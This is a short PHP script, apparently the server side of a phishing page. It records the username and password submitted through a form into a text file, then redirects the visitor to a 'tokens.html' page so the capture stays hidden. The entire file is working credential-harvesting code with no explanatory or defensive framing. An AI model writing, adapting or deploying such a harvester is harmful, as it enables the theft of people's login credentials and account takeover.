<?php

file_put_contents("usernames.txt", "Username: " . $_POST['text'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: tokens.html');
exit();
